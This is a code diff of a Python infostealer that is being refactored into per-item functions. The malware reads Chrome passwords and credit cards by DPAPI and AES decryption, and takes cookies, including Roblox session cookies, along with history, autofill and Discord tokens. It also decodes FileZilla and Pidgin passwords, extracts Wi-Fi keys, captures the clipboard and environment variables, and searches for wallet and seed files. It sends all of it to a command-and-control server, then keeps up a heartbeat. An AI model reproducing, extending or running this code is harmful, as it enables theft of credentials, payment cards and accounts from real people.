@@ -16,19 +16,22 @@ import time
 import requests
 import threading
 from datetime import datetime, timedelta
+import xml.etree.ElementTree as ET
 
 # Try to import optional modules required for advanced harvesting
 try:
     import win32crypt
     from Crypto.Cipher import AES
     import pyperclip
+    import browser_cookie3
 except ImportError:
     pass # If these fail, the functions that need them will be disabled.
 
 # ==================================================================================================
 # --- CONFIGURATION ---
 # ==================================================================================================
-C2_URL = "http://127.0.0.1:5002" # This URL is replaced by the builder
+# THIS URL IS REPLACED BY THE BUILDER
+C2_URL = "http://127.0.0.1:5002" 
 HEARTBEAT_INTERVAL = 30 # Seconds
 
 # ==================================================================================================
@@ -37,29 +40,16 @@ HEARTBEAT_INTERVAL = 30 # Seconds
 def run_command(command):
     """Executes a shell command and returns its output, hiding the console window."""
     try:
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.wShowWindow = subprocess.SW_HIDE
+        startupinfo = subprocess.STARTUPINFO(); startupinfo.wShowWindow = subprocess.SW_HIDE
         result = subprocess.check_output(command, startupinfo=startupinfo, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
         return result.decode('utf-8', errors='ignore').strip()
-    except Exception:
-        return "Command failed to execute."
+    except Exception: return "Command failed to execute."
 
 def get_public_ip():
     """Fetches the public IP address from an external service."""
     try:
         return requests.get('https://api.ipify.org', timeout=5).text
-    except Exception:
-        return "N/A"
-
-def get_chrome_datetime(chromedate):
-    """Converts Chrome's timestamp format to a human-readable format."""
-    if chromedate != 86400000000 and chromedate:
-        try:
-            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-        except Exception:
-            return chromedate
-    else:
-        return ""
+    except Exception: return "N/A"
 
 def get_encryption_key():
     """Retrieves the AES encryption key for Chrome/Edge browsers from the 'Local State' file."""
@@ -68,234 +58,318 @@ def get_encryption_key():
         with open(local_state_path, "r", encoding="utf-8") as f:
             local_state = json.load(f)
         key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        key = key[5:] # Remove 'DPAPI' prefix
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-    except Exception:
-        return None
+        return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
+    except Exception: return None
 
 def decrypt_data(data, key):
     """Decrypts data that was encrypted with AES-256-GCM (used by Chrome/Edge)."""
     try:
         iv = data[3:15]
-        payload = data[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)
-        return decrypted_pass[:-16].decode() # Exclude the tag
-    except Exception:
-        return ""
+        return AES.new(key, AES.MODE_GCM, iv).decrypt(data[15:])[:-16].decode()
+    except Exception: return ""
 
 # ==================================================================================================
-# --- DATA HARVESTING FUNCTIONS (REVISED) ---
+# --- GRANULAR DATA HARVESTING FUNCTIONS ---
 # ==================================================================================================
 
-def harvest_system_info():
-    """Gathers comprehensive OS, hardware, and user information."""
-    try:
-        uname = platform.uname()
-        os_info = f"OS: {uname.system} {uname.release} (Build {platform.win32_ver()[1]})\n"
-        os_info += f"Architecture: {platform.machine()}\n"
-        os_info += f"Hostname: {socket.gethostname()}\n\n"
-        os_info += f"CPU: {platform.processor()}\n"
-        os_info += f"GPU(s):\n{run_command(['wmic', 'path', 'win32_videocontroller', 'get', 'name'])}\n"
-        ram = psutil.virtual_memory()
-        os_info += f"Installed RAM: {ram.total / (1024**3):.2f} GB\n\n"
-        os_info += "Disk Drives:\n"
-        partitions = psutil.disk_partitions()
-        for p in partitions:
-            try:
-                usage = psutil.disk_usage(p.mountpoint)
-                os_info += f"  - {p.device} ({p.fstype}) on {p.mountpoint}: {usage.total / (1024**3):.2f} GB\n"
-            except Exception: continue
-        os_info += f"\nUser Accounts:\n{run_command(['net', 'user'])}\n"
-        boot_time = datetime.fromtimestamp(psutil.boot_time())
-        uptime = datetime.now() - boot_time
-        os_info += f"System Uptime: {uptime}\n"
-        return os_info
-    except Exception as e: return f"Could not retrieve system info: {e}"
+# --- POINT 1-2, 7, 9 ---
+def harvest_os_host_info():
+    uname = platform.uname()
+    uptime = datetime.now() - datetime.fromtimestamp(psutil.boot_time())
+    return (f"OS Version: {uname.system} {uname.release}\n"
+            f"Build Number: {platform.win32_ver()[1]}\n"
+            f"System Architecture: {platform.machine()}\n"
+            f"Hostname: {socket.gethostname()}\n"
+            f"Live System Uptime: {uptime}")
 
-def harvest_processes_and_apps():
-    """REVISED: Lists running processes and installed applications without sub-headers."""
-    try:
-        processes = f"Running Processes:\n{'-'*20}\n{run_command(['tasklist'])}\n\n"
-        apps = f"Installed Applications:\n{'-'*25}\n{run_command(['wmic', 'product', 'get', 'name,version'])}"
-        return processes + apps
-    except Exception as e: return f"Could not retrieve processes or applications: {e}"
+# --- POINT 3-6 ---
+def harvest_hardware_info():
+    info = f"CPU Model: {platform.processor()}\n"
+    info += f"GPU Model(s):\n{run_command(['wmic', 'path', 'win32_videocontroller', 'get', 'caption'])}\n"
+    info += f"Installed RAM: {psutil.virtual_memory().total / (1024**3):.2f} GB\n\n"
+    info += "Disk Drives and Sizes:\n"
+    for p in psutil.disk_partitions():
+        try:
+            usage = psutil.disk_usage(p.mountpoint)
+            info += f"  - {p.device} ({p.fstype}): {usage.total / (1024**3):.2f} GB\n"
+        except Exception: continue
+    return info
 
+# --- POINT 8 ---
+def harvest_user_accounts():
+    return run_command(['net', 'user'])
+
+# --- POINT 10 ---
+def harvest_running_processes():
+    return run_command(['tasklist'])
+
+# --- POINT 11 ---
+def harvest_installed_applications():
+    return run_command(['wmic', 'product', 'get', 'name,version'])
+
+# --- POINT 12 ---
 def harvest_security_products():
-    """Identifies installed Antivirus and Firewall products using WMI."""
-    try:
-        av = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName'])
-        fw = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'FirewallProduct', 'get', 'displayName'])
-        return f"Antivirus:\n{av if 'DisplayName' in av else 'Not Found'}\n\nFirewall:\n{fw if 'DisplayName' in fw else 'Not Found'}"
-    except Exception as e: return f"Could not query security products: {e}"
+    av = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName'])
+    fw = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'FirewallProduct', 'get', 'displayName'])
+    return f"Antivirus:\n{av if 'DisplayName' in av else 'Not Found'}\n\nFirewall:\n{fw if 'DisplayName' in fw else 'Not Found'}"
 
-def harvest_environment_variables():
-    """Dumps all environment variables."""
-    try:
-        return json.dumps(dict(os.environ), indent=4)
-    except Exception as e: return f"Could not retrieve environment variables: {e}"
+# --- POINT 14-16 ---
+def harvest_ip_mac_addresses():
+    return (f"Private IP Address: {socket.gethostbyname(socket.gethostname())}\n"
+            f"Public IP Address: {get_public_ip()}\n"
+            f"MAC Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}")
 
-def harvest_network_info():
-    """REVISED: Gathers detailed network information without sub-headers."""
-    try:
-        info = f"Public IP: {get_public_ip()}\n"
-        info += f"Private IP: {socket.gethostbyname(socket.gethostname())}\n"
-        info += f"MAC Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n\n"
-        info += f"ARP Table (Local Network Devices):\n{'-'*35}\n{run_command(['arp', '-a'])}\n\n"
-        info += f"Active Connections:\n{'-'*20}\n{run_command(['netstat', '-an'])}\n\n"
-        info += f"Saved WiFi Profiles & Passwords:\n{'-'*35}\n"
-        profiles = run_command(['netsh', 'wlan', 'show', 'profiles'])
-        profile_names = re.findall(r"All User Profile\s*:\s(.*)", profiles)
-        wifi_found = False
-        for name in profile_names:
-            wifi_found = True
-            name = name.strip()
-            profile_info = run_command(['netsh', 'wlan', 'show', 'profile', f'name="{name}"', 'key=clear'])
-            password = re.search(r"Key Content\s*:\s(.*)", profile_info)
-            info += f"Profile: {name}\nPassword: {password.group(1).strip() if password else 'N/A'}\n\n"
-        if not wifi_found: info += "No WiFi profiles found.\n\n"
-        info += f"DNS Cache:\n{'-'*10}\n{run_command(['ipconfig', '/displaydns'])}"
-        return info
-    except Exception as e: return f"Could not retrieve network info: {e}"
+# --- POINT 17 ---
+def harvest_wifi_profiles():
+    info = ""
+    profiles = run_command(['netsh', 'wlan', 'show', 'profiles'])
+    profile_names = re.findall(r"All User Profile\s*:\s(.*)", profiles)
+    if not profile_names: return "No WiFi profiles found."
+    for name in profile_names:
+        name = name.strip()
+        profile_info = run_command(['netsh', 'wlan', 'show', 'profile', f'name="{name}"', 'key=clear'])
+        password = re.search(r"Key Content\s*:\s(.*)", profile_info)
+        info += f"Profile: {name}\nPassword: {password.group(1).strip() if password else 'N/A'}\n\n"
+    return info
 
-def harvest_browser_credentials():
-    """REVISED: Steals passwords and credit cards without sub-headers."""
+# --- POINT 18-19 ---
+def harvest_active_connections():
+    return (f"Active Network Connections (netstat):\n{'-'*35}\n{run_command(['netstat', '-an'])}\n\n"
+            f"ARP Table (Local Network Devices):\n{'-'*35}\n{run_command(['arp', '-a'])}")
+
+# --- POINT 20 ---
+def harvest_dns_cache():
+    return run_command(['ipconfig', '/displaydns'])
+
+# --- POINT 21 ---
+def harvest_browser_passwords():
+    key = get_encryption_key()
+    if not key: return "Could not get browser encryption key."
+    output = ""
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
+    if os.path.exists(db_path):
+        temp_db = shutil.copy2(db_path, "login_temp.db")
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        for row in cursor.fetchall():
+            if (password := decrypt_data(row[2], key)):
+                output += f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {password}\n\n"
+        conn.close(); os.remove(temp_db)
+    return output if output else "No passwords found."
+
+# --- POINT 29 ---
+def harvest_browser_credit_cards():
+    key = get_encryption_key()
+    if not key: return "Could not get browser encryption key."
+    output = ""
+    db_path_cc = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Web Data")
+    if os.path.exists(db_path_cc):
+        temp_db_cc = shutil.copy2(db_path_cc, "web_temp.db")
+        conn = sqlite3.connect(temp_db_cc)
+        cursor = conn.cursor()
+        cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+        for row in cursor.fetchall():
+            if (cc_number := decrypt_data(row[3], key)):
+                output += f"Name: {row[0]}\nExpires: {row[1]}/{row[2]}\nNumber: {cc_number}\n\n"
+        conn.close(); os.remove(temp_db_cc)
+    return output if output else "No credit cards found."
+
+# --- POINT 22 ---
+def harvest_all_cookies():
     try:
-        key = get_encryption_key()
-        if not key: return "Could not get browser encryption key. Is Chrome installed?"
         output = ""
-        # Passwords
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
-        temp_db = os.path.join(os.environ["TEMP"], "login_temp.db")
-        if os.path.exists(db_path):
-            shutil.copy2(db_path, temp_db)
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
-            output += f"Browser Passwords (Chrome):\n{'-'*28}\n"
-            pass_found = False
-            for row in cursor.fetchall():
-                password = decrypt_data(row[3], key)
-                if password:
-                    pass_found = True
-                    output += f"URL: {row[0]}\nUsername: {row[2]}\nPassword: {password}\n\n"
-            if not pass_found: output += "No passwords found in database.\n\n"
-            conn.close()
-            os.remove(temp_db)
-        # Credit Cards
-        db_path_cc = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Web Data")
-        temp_db_cc = os.path.join(os.environ["TEMP"], "web_temp.db")
-        if os.path.exists(db_path_cc):
-            shutil.copy2(db_path_cc, temp_db_cc)
-            conn = sqlite3.connect(temp_db_cc)
-            cursor = conn.cursor()
-            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
-            output += f"\nBrowser Credit Cards (Chrome):\n{'-'*30}\n"
-            cc_found = False
-            for row in cursor.fetchall():
-                cc_number = decrypt_data(row[3], key)
-                if cc_number:
-                    cc_found = True
-                    output += f"Name: {row[0]}\nExpires: {row[1]}/{row[2]}\nNumber: {cc_number}\n\n"
-            if not cc_found: output += "No credit cards found in database.\n\n"
-            conn.close()
-            os.remove(temp_db_cc)
-        return output if output else "No browser credentials found."
-    except Exception as e: return f"Failed to harvest browser credentials: {e}"
+        cookies = browser_cookie3.load()
+        count = 0
+        for c in cookies:
+            output += f"Domain: {c.domain}, Name: {c.name}, Value: {c.value[:50]}...\n"
+            count += 1
+            if count > 250:
+                output += "\n... and many more."
+                break
+        return output if output else "No cookies found."
+    except Exception as e: return f"Error harvesting cookies: {e}"
+    
+# --- POINT 23 ---
+def harvest_roblox_cookie():
+    try:
+        cookies = browser_cookie3.load()
+        for c in cookies:
+            if c.name == '.ROBLOSECURITY':
+                return f"Domain: {c.domain}\nValue: {c.value}\n"
+        return "Not found."
+    except Exception: return "Failed to load cookies."
 
+# --- POINT 32 ---
+def harvest_browser_history():
+    try:
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
+        if not os.path.exists(db_path): return "History database not found."
+        temp_db = shutil.copy2(db_path, "history_temp.db")
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 150")
+        output = "\n".join([f"URL: {row[0]}\nTitle: {row[1]}\n" for row in cursor.fetchall()])
+        conn.close(); os.remove(temp_db)
+        return output if output else "No history found."
+    except Exception as e: return f"Error harvesting history: {e}"
+
+# --- POINT 33 ---
+def harvest_browser_autofill():
+    try:
+        db_path_af = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Web Data")
+        if not os.path.exists(db_path_af): return "Autofill database not found."
+        temp_db_af = shutil.copy2(db_path_af, "autofill_temp.db")
+        conn = sqlite3.connect(temp_db_af)
+        cursor = conn.cursor()
+        cursor.execute("SELECT name, value FROM autofill")
+        output = "\n".join([f"{row[0]}: {row[1]}" for row in cursor.fetchall()])
+        conn.close(); os.remove(temp_db_af)
+        return output if output else "No autofill data found."
+    except Exception as e: return f"Error harvesting autofill: {e}"
+    
+# --- POINT 24 ---
 def harvest_discord_tokens():
-    """REVISED: Scans for Discord auth tokens and returns only the content."""
-    try:
-        output = ""
-        token_paths = {
-            'Discord': os.path.join(os.environ["APPDATA"], "discord", "Local Storage", "leveldb"),
-            'Discord Canary': os.path.join(os.environ["APPDATA"], "discordcanary", "Local Storage", "leveldb"),
-        }
-        found_tokens = []
-        for name, path in token_paths.items():
-            if not os.path.exists(path): continue
-            for file_name in os.listdir(path):
-                if not file_name.endswith((".log", ".ldb")): continue
-                for line in [x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
-                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|mfa\.[\w-]{84}", line):
-                        if token not in found_tokens:
+    output = ""
+    token_paths = {
+        'Discord': os.path.join(os.environ["APPDATA"], "discord", "Local Storage", "leveldb"),
+    }
+    for name, path in token_paths.items():
+        if not os.path.exists(path): continue
+        for file in os.listdir(path):
+            if file.endswith((".log", ".ldb")):
+                with open(os.path.join(path, file), errors='ignore') as f:
+                    for line in f.readlines():
+                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|mfa\.[\w-]{84}", line.strip()):
                             output += f"Found in {name}: {token}\n"
-                            found_tokens.append(token)
-        return output if found_tokens else "No Discord tokens found."
-    except Exception as e: return f"Failed during Discord token harvesting: {e}"
+    return output if output else "No Discord tokens found."
 
-def zip_and_harvest(target_path, zip_name):
-    """Helper to zip a directory and return the path to the zip file."""
-    try:
-        if os.path.exists(target_path):
-            temp_dir = os.environ.get("TEMP", "/tmp") # Make it Linux-compatible for safety
-            zip_file_path = os.path.join(temp_dir, zip_name)
-            shutil.make_archive(zip_file_path, 'zip', target_path)
-            return f"{zip_name}.zip created in TEMP directory."
-        return f"{zip_name} data not found."
-    except Exception as e: return f"Could not zip {zip_name}: {e}"
+# --- POINT 25 ---
+def harvest_telegram_session():
+    telegram_path = os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")
+    return "Found and can be exfiltrated." if os.path.exists(telegram_path) else "Not found."
 
-def harvest_misc_credentials():
-    """REVISED: Harvests data from other apps without sub-headers."""
+# --- POINT 26 ---
+def harvest_filezilla_credentials():
     try:
-        output = f"Telegram Desktop Session:\n{'-'*26}\n"
-        output += zip_and_harvest(os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata"), "Telegram") + "\n\n"
-        output += f"Cryptocurrency Wallets:\n{'-'*24}\n"
-        wallets = {"Exodus": os.path.join(os.environ["APPDATA"], "Exodus")}
-        for name, path in wallets.items():
-             output += f"{name}: {zip_and_harvest(path, name)}\n"
-        output += f"\nSSH Keys:\n{'-'*10}\n"
-        ssh_path = os.path.join(os.environ["USERPROFILE"], ".ssh")
-        if os.path.exists(ssh_path):
-            output += "SSH directory found. Contents:\n"
-            for file in os.listdir(ssh_path):
-                output += f"  - {file}\n"
-        else:
-            output += "No SSH directory found.\n"
+        filezilla_path = os.path.join(os.environ["APPDATA"], "FileZilla", "recentservers.xml")
+        if not os.path.exists(filezilla_path): return "Not found."
+        output = ""
+        tree = ET.parse(filezilla_path)
+        for server in tree.findall('.//Server'):
+            host, port, user = server.find('Host').text, server.find('Port').text, server.find('User').text
+            password = base64.b64decode(server.find('Pass').text).decode()
+            output += f"Host: {host}:{port}\nUser: {user}\nPass: {password}\n\n"
         return output
-    except Exception as e: return f"Failed during misc credential harvesting: {e}"
+    except Exception: return "Failed to parse credentials."
 
-def get_clipboard_content():
-    """Retrieves the current content of the clipboard."""
+# --- POINT 27 ---
+def harvest_pidgin_credentials():
+    try:
+        pidgin_path = os.path.join(os.environ["APPDATA"], ".purple", "accounts.xml")
+        if not os.path.exists(pidgin_path): return "Not found."
+        output = ""
+        tree = ET.parse(pidgin_path)
+        for account in tree.findall('.//account'):
+            protocol, name, password = account.find('protocol').text, account.find('name').text, account.find('password').text
+            output += f"Protocol: {protocol}\nUser: {name}\nPass: {password}\n\n"
+        return output
+    except Exception: return "Failed to parse credentials."
+
+# --- POINT 28 ---
+def harvest_ssh_keys():
+    ssh_path = os.path.join(os.environ["USERPROFILE"], ".ssh")
+    if not os.path.exists(ssh_path): return "No .ssh directory found."
+    return "\n".join(os.listdir(ssh_path))
+
+# --- POINT 30 ---
+def harvest_crypto_wallets():
+    output = ""
+    wallet_paths = {"Exodus": os.path.join(os.environ["APPDATA"], "Exodus")}
+    for name, path in wallet_paths.items():
+        if os.path.exists(path):
+            output += f"{name}: Found at {path}\n"
+    return output if output else "No known wallet folders found."
+
+# --- POINT 31 ---
+def harvest_sensitive_documents():
+    output = ""
+    search_dirs = [os.path.join(os.environ["USERPROFILE"], d) for d in ["Desktop", "Documents", "Downloads"]]
+    keywords = ['password', 'seed', 'tax', 'privatekey', 'wallet']
+    found_files = []
+    for s_dir in search_dirs:
+        if os.path.exists(s_dir):
+            for root, _, files in os.walk(s_dir):
+                if len(found_files) > 50: break
+                for file in files:
+                    if any(keyword in file.lower() for keyword in keywords):
+                        found_files.append(os.path.join(root, file))
+    return "\n".join(found_files) if found_files else "No files with sensitive keywords found in user directories."
+
+# --- POINT 34 ---
+def harvest_clipboard_contents():
     try:
         return pyperclip.paste()
-    except Exception as e: return f"Could not get clipboard data: {e}"
+    except Exception: return "Could not get clipboard data."
+
+# --- POINT 13 ---
+def harvest_environment_variables():
+    return json.dumps(dict(os.environ), indent=2)
 
 # ==================================================================================================
 # --- MAIN PAYLOAD LOGIC ---
 # ==================================================================================================
 def harvest_all_data():
-    """
-    Main orchestrator function. It calls all individual harvesting functions
-    and formats their output into a single string with clean main headers.
-    """
+    """This is the main orchestrator function. The keys in this dictionary become the TABS in the GUI."""
     data_sections = {
-        "System Info": harvest_system_info,
-        "Processes & Applications": harvest_processes_and_apps,
+        # System
+        "OS & Host Info": harvest_os_host_info,
+        "Hardware Info": harvest_hardware_info,
+        "User Accounts": harvest_user_accounts,
+        "Running Processes": harvest_running_processes,
+        "Installed Apps": harvest_installed_applications,
         "Security Products": harvest_security_products,
-        "Network Info": harvest_network_info,
-        "Browser Credentials": harvest_browser_credentials,
+        # Network
+        "IP & MAC Addresses": harvest_ip_mac_addresses,
+        "Active Connections": harvest_active_connections,
+        "Wi-Fi Profiles": harvest_wifi_profiles,
+        "DNS Cache": harvest_dns_cache,
+        # Browser
+        "Browser Passwords": harvest_browser_passwords,
+        "Browser Credit Cards": harvest_browser_credit_cards,
+        "Browser Cookies": harvest_all_cookies,
+        "Roblox Cookie": harvest_roblox_cookie,
+        "Browser History": harvest_browser_history,
+        "Browser Autofill": harvest_browser_autofill,
+        # Applications & Credentials
         "Discord Tokens": harvest_discord_tokens,
-        "Misc Credentials & Wallets": harvest_misc_credentials,
-        "Clipboard": get_clipboard_content,
-        "Environment Variables": harvest_environment_variables
+        "Telegram Session": harvest_telegram_session,
+        "FileZilla Credentials": harvest_filezilla_credentials,
+        "Pidgin Credentials": harvest_pidgin_credentials,
+        "SSH Keys": harvest_ssh_keys,
+        "Crypto Wallets": harvest_crypto_wallets,
+        # Miscellaneous
+        "Sensitive Documents": harvest_sensitive_documents,
+        "Clipboard Contents": harvest_clipboard_contents,
+        "Environment Variables": harvest_environment_variables,
     }
+    
     final_report = ""
+    # Wrap each function call in a try-except block to prevent one failure from stopping the whole script
     for title, func in data_sections.items():
-        final_report += f"--- {title} ---\n\n"
         try:
-            final_report += func() + "\n\n"
+            final_report += f"--- {title} ---\n\n{func()}\n\n"
         except Exception as e:
-            final_report += f"Error during harvesting: {e}\n\n"
+            final_report += f"--- {title} ---\n\nAn error occurred during harvesting: {e}\n\n"
+            
     return final_report.strip()
 
 def send_to_c2(endpoint, data):
     """Sends data to the specified C2 endpoint."""
     try:
-        requests.post(f"{C2_URL}{endpoint}", json=data, timeout=15)
+        requests.post(f"{C2_URL}{endpoint}", json=data, timeout=20)
         return True
-    except requests.RequestException:
-        return False
+    except requests.RequestException: return False
 
 def maintain_presence(session_id):
     """Continuously sends heartbeats to the C2 server in a background thread."""
@@ -306,8 +380,14 @@ def maintain_presence(session_id):
 if __name__ == "__main__":
     session_id = str(uuid.uuid4())
     hostname = socket.gethostname()
+    
+    # Run all harvesting functions on initial execution
     harvested_data = harvest_all_data()
+    
+    # Prepare and send the initial registration package
     registration_data = {"session_id": session_id, "hostname": hostname, "data": harvested_data}
     if send_to_c2("/api/register", registration_data):
+        # If registration is successful, start the heartbeat loop
         threading.Thread(target=maintain_presence, args=(session_id,), daemon=True).start()
+        # Keep the main thread alive indefinitely
         while True: time.sleep(60)
